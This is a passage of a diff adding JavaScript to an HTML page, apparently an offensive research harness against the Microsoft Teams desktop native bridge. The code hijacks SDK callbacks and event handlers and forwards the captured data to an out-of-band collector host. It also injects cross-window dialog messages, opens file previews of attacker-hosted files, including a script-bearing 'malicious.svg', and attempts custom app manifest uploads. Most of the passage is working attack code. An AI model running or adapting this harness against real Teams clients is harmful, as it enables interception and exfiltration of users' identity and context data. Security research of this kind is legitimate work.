+  var origFPM = NI.framelessPostMessage;
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func && parsed.func.indexOf('getContext') !== -1 && !realId) {
+        realId = parsed.id;
+        log('Step 2: Captured real SDK request id=' + realId, 'crit');
+
+        // Now check if this ID appears in callbacks
+        setTimeout(function() {
+          if (NI.callbacks && NI.callbacks[realId]) {
+            log('Step 3: Found callback[' + realId + '] in NI.callbacks', 'crit');
+            log('  Original: ' + NI.callbacks[realId].toString().substring(0, 100), 'info');
+
+            // Replace it with our own
+            var originalCb = NI.callbacks[realId];
+            NI.callbacks[realId] = function() {
+              var args = Array.from(arguments);
+              log('*** HIJACKED CALLBACK FIRED ***', 'crit');
+              log('  Data meant for SDK: ' + safStr(args, 3).substring(0, 400), 'crit');
+              ex('p4a-hijacked', { id: realId, data: safStr(args, 3).substring(0, 400) });
+
+              // Optionally forward to original
+              // return originalCb.apply(this, arguments);
+            };
+            log('Step 4: Callback REPLACED — waiting for native response...', 'warn');
+          } else {
+            log('Step 3: callback[' + realId + '] NOT found in NI.callbacks', 'warn');
+            log('  callbacks keys: ' + (NI.callbacks ? Object.keys(NI.callbacks).join(',') : 'N/A'), 'info');
+          }
+        }, 50);
+      }
+    } catch(e) {}
+    return origFPM.apply(this, arguments);
+  };
+
+  // Make the actual SDK call
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('SDK getContext resolved: ' + (ctx.user ? ctx.user.userPrincipalName : 'N/A'), 'info');
+    log('(if callback was hijacked, this may not fire or may have stale data)', 'warn');
+  }).catch(function(e) {
+    log('SDK getContext error: ' + e.message, 'info');
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = origFPM; }, 5000);
+}
+
+function p4HijackHandler() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P4b: HIJACK REGISTERED HANDLER — prove native event triggers attacker code', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  // Replace registered handlers with attacker code
+  var handlersToHijack = ['themeChange', 'backButtonPress', 'fullScreenChange', 'focusEnter'];
+
+  for (var h of handlersToHijack) {
+    if (NI.handlers && NI.handlers[h]) {
+      var origHandler = NI.handlers[h];
+      (function(name, orig) {
+        NI.handlers[name] = function() {
+          var args = Array.from(arguments);
+          log('*** HIJACKED HANDLER ' + name + ' FIRED ***', 'crit');
+          log('  args: ' + safStr(args, 2), 'crit');
+          ex('p4b-hijacked-' + name, { args: safStr(args, 2).substring(0, 300) });
+          // Forward to original
+          if (orig) return orig.apply(this, arguments);
+        };
+        log('Replaced handler: ' + name, 'ok');
+      })(h, origHandler);
+    } else {
+      log('Handler ' + h + ' not found', 'warn');
+    }
+  }
+
+  // Trigger some events via processMessageRequest to see if our hijacked handlers fire
+  log('\nTriggering events via processMessageRequest...', 'info');
+  var events = [
+    { func: 'themeChange', args: ['dark'] },
+    { func: 'backButtonPress', args: [] },
+    { func: 'fullScreenChange', args: [true] },
+  ];
+
+  for (var evt of events) {
+    try {
+      NI.processMessageRequest(JSON.stringify(evt));
+      log('  processMessageRequest(' + evt.func + '): sent', 'ok');
+    } catch(e) {
+      log('  processMessageRequest(' + evt.func + '): ' + e.message, 'fail');
+    }
+  }
+
+  log('\nHandlers hijacked — if user presses back button or Teams changes', 'warn');
+  log('theme, our code will fire and exfiltrate to OAST', 'warn');
+}
+
+function p4InjectDialogMsg() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P4c: INJECT messageForChild — cross-window message manipulation', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  // If messageForChild handler exists, we can inject messages that
+  // would normally come from a parent dialog controller
+
+  if (NI.handlers && NI.handlers['messageForChild']) {
+    log('messageForChild handler EXISTS', 'crit');
+
+    // Replace it
+    var origMFC = NI.handlers['messageForChild'];
+    NI.handlers['messageForChild'] = function() {
+      var args = Array.from(arguments);
+      log('*** messageForChild intercepted ***', 'crit');
+      log('  data: ' + safStr(args, 3).substring(0, 300), 'crit');
+      ex('p4c-msg-child', { data: safStr(args, 3).substring(0, 300) });
+      if (origMFC) return origMFC.apply(this, arguments);
+    };
+
+    // Now trigger it
+    try {
+      NI.processMessageRequest(JSON.stringify({
+        func: 'messageForChild',
+        args: ['attacker-injected-message-to-dialog']
+      }));
+      log('Injected messageForChild via processMessageRequest', 'ok');
+    } catch(e) {
+      log('processMessageRequest error: ' + e.message, 'fail');
+    }
+  } else {
+    log('messageForChild handler not found', 'warn');
+  }
+
+  // Also try messageForParent
+  log('\n--- messageForParent via bridge ---', 'info');
+  var id = bridgeSend('messageForParent', ['attacker-message-from-tab']);
+  log('messageForParent sent id=' + id, id ? 'ok' : 'fail');
+}
+
+
+// ================================================================
+// P5: FILE PREVIEW ESCALATION
+// ================================================================
+
+function p5FileTest(n) {
+  log('\n' + '='.repeat(60), 'info');
+  log('P5' + String.fromCharCode(96 + n) + ': FILE PREVIEW TEST #' + n, 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  var tests = {
+    // 1: Malformed PDF — does QuickLook parse it? crash?
+    1: {
+      title: 'report-q4.pdf', type: 'pdf', desc: 'Quarterly Report',
+      objectUrl: 'https://' + C + '/p5a-malformed.pdf',
+      downloadUrl: 'https://' + C + '/p5a-download.pdf',
+      webPreviewUrl: 'https://' + C + '/p5a-webpreview.pdf',
+      note: 'OAST will serve whatever response — check UA, headers, cookies from native host'
+    },
+    // 2: DOCX — does native Office parser handle it?
+    2: {
+      title: 'strategy-2026.docx', type: 'docx', desc: 'Strategy Document',
+      objectUrl: 'https://' + C + '/p5b-test.docx',
+      downloadUrl: 'https://' + C + '/p5b-download.docx',
+      webPreviewUrl: 'https://' + C + '/p5b-webpreview.docx',
+      note: 'Check if Office native parser is invoked'
+    },
+    // 3: MIME mismatch — type says SVG, server sends HTML with JS
+    3: {
+      title: 'diagram.svg', type: 'svg', desc: 'Architecture',
+      objectUrl: 'https://' + C + '/p5c-html-as-svg.html',
+      downloadUrl: 'https://' + C + '/p5c-dl-html-as-svg.html',
+      webPreviewUrl: 'https://' + C + '/p5c-web-html-as-svg.html',
+      note: 'Type says SVG, content is HTML — does JS execute?'
+    },
+    // 4: Redirect chain — does native follow redirects?
+    4: {
+      title: 'data-export.csv', type: 'csv', desc: 'Data Export',
+      objectUrl: 'https://' + C + '/p5d-redirect-1',
+      downloadUrl: 'https://' + C + '/p5d-redirect-2',
+      webPreviewUrl: 'https://' + C + '/p5d-redirect-3',
+      note: 'Each URL returns 302 to next — does native follow? How many?'
+    },
+    // 5: Large file + range requests
+    5: {
+      title: 'presentation.pptx', type: 'pptx', desc: 'Presentation',
+      objectUrl: 'https://' + C + '/p5e-large-file',
+      downloadUrl: 'https://' + C + '/p5e-large-dl',
+      webPreviewUrl: 'https://' + C + '/p5e-large-web',
+      sizeInBytes: 104857600, // 100MB claimed
+      note: 'Claim 100MB — does native send Range headers? Memory behavior?'
+    },
+    // 6: SVG with external refs (XInclude, use href, image href)
+    6: {
+      title: 'network-map.svg', type: 'svg', desc: 'Network Map',
+      objectUrl: 'https://pedrojuniorrd.github.io/_layouts/malicious.svg',
+      downloadUrl: 'https://pedrojuniorrd.github.io/_layouts/malicious.svg',
+      webPreviewUrl: 'https://pedrojuniorrd.github.io/_layouts/malicious.svg',
+      note: 'Deployed SVG with script + foreignObject — does JS execute in preview?'
+    },
+  };
+
+  var t = tests[n];
+  if (!t) { log('Invalid test', 'fail'); return; }
+
+  log('title: ' + t.title, 'info');
+  log('type: ' + t.type, 'info');
+  log('objectUrl: ' + t.objectUrl, 'info');
+  log('note: ' + t.note, 'warn');
+
+  var params = [
+    'p5-' + n + '-' + Date.now(),  // entityId
+    t.title,                        // title
+    t.desc,                         // description
+    t.type,                         // type
+    t.objectUrl,                    // objectUrl
+    t.downloadUrl,                  // downloadUrl
+    t.webPreviewUrl || '',          // webPreviewUrl
+    '',                             // webEditUrl
+    '',                             // baseUrl
+    false,                          // editFile
+    '',                             // subEntityId
+    'view',                         // viewerAction
+    0,                              // fileOpenPreference
+    '',                             // conversationId
+    t.sizeInBytes || 2048,          // sizeInBytes
+    '', '', '', '', ''              // remaining params
+  ];
+
+  bridgeSend('openFilePreview', params);
+  log('openFilePreview sent', 'ok');
+  ex('p5-' + n + '-sent', { type: t.type, url: t.objectUrl.substring(0, 200) });
+
+  // Also try with different fileOpenPreference values
+  if (n <= 3) {
+    for (var pref = 1; pref <= 3; pref++) {
+      var params2 = params.slice();
+      params2[0] = 'p5-' + n + '-pref' + pref + '-' + Date.now();
+      params2[12] = pref;
+      bridgeSend('openFilePreview', params2);
+      log('  also sent with fileOpenPreference=' + pref, 'info');
+    }
+  }
+}
+
+
+// ================================================================
+// P6: UPLOAD CUSTOM APP
+// ================================================================
+
+function p6UploadInvalid() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P6a: UPLOAD CUSTOM APP — invalid manifest (observe validation)', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  // Send deliberately invalid manifests to understand validation
+  var invalids = [
+    { name: 'empty obj', data: '{}' },
+    { name: 'just name', data: JSON.stringify({ name: { short: 'Test' } }) },
+    { name: 'no schema', data: JSON.stringify({
+      manifestVersion: '1.16', version: '1.0.0', id: '00000000-0000-0000-0000-000000000001',
+      name: { short: 'Test' }
+    })},
+    { name: 'string payload', data: 'not-json' },
+  ];
+
+  for (var inv of invalids) {
+    log('\n--- ' + inv.name + ' ---', 'info');
+    var id = bridgeSend('uploadCustomApp', [inv.data]);
+    log('  sent id=' + id, id ? 'ok' : 'fail');
+
+    // Also try via sdkRequest
+    try {
+      var r = NI.sdkRequest(JSON.stringify({ id: msgId++, func: 'uploadCustomApp', args: [inv.data], timestamp: Date.now() }));
+      log('  sdkRequest result: ' + safStr(r, 1), 'info');
+    } catch(e) {
+      log('  sdkRequest error: ' + e.message, 'fail');
+    }
+  }
+}
+
+function p6UploadMinimal() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P6b: UPLOAD CUSTOM APP — minimal valid manifest', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  var manifest = JSON.stringify({
+    "$schema": "https://developer.microsoft.com/en-us/json-schemas/teams/v1.16/MicrosoftTeams.schema.json",
+    "manifestVersion": "1.16",
+    "version": "1.0.0",
+    "id": "11111111-1111-1111-1111-111111111111",
+    "developer": {
+      "name": "Security Test",
+      "websiteUrl": "https://pedrojuniorrd.github.io",
+      "privacyUrl": "https://pedrojuniorrd.github.io/privacy",
+      "termsOfUseUrl": "https://pedrojuniorrd.github.io/terms"
+    },
+    "name": { "short": "SecTest", "full": "Security Test App" },
+    "description": { "short": "test", "full": "Security testing app" },
+    "icons": { "color": "color.png", "outline": "outline.png" },
+    "accentColor": "#FFFFFF",
+    "staticTabs": [{
+      "entityId": "home",
+      "name": "Home",
+      "contentUrl": "https://" + C + "/p6b-custom-app-tab",
+      "scopes": ["personal"]
+    }],
+    "permissions": ["identity", "messageTeamMembers"],
+    "validDomains": [C, "pedrojuniorrd.github.io"]
+  });
+
+  log('Manifest size: ' + manifest.length + ' bytes', 'info');
+
+  // Method 1: bridgeSend
+  var id1 = bridgeSend('uploadCustomApp', [manifest]);
+  log('bridgeSend(uploadCustomApp): id=' + id1, id1 ? 'ok' : 'fail');
+
+  // Method 2: Blob format (how the SDK actually sends it)
+  try {
+    var blob = new Blob([manifest], { type: 'application/json' });
+    var reader = new FileReader();
+    reader.onload = function() {
+      var id2 = bridgeSend('uploadCustomApp', [reader.result]);
+      log('bridgeSend(uploadCustomApp) with base64: id=' + id2, id2 ? 'ok' : 'fail');
+    };
+    reader.readAsDataURL(blob);
+  } catch(e) {
+    log('Blob approach error: ' + e.message, 'fail');
+  }
+
+  // Method 3: via sdkRequest
+  try {
+    var r = NI.sdkRequest(JSON.stringify({
+      id: msgId++, func: 'uploadCustomApp', args: [manifest], timestamp: Date.now()
+    }));
+    log('sdkRequest(uploadCustomApp): ' + safStr(r, 1), 'info');
+  } catch(e) {
+    log('sdkRequest error: ' + e.message, 'fail');
+  }
+
+  log('\nCheck: Teams UI reaction, OAST callbacks, error responses', 'warn');
+  ex('p6b-sent', { manifestSize: manifest.length });
+}
+</script>
+</body>
+</html>
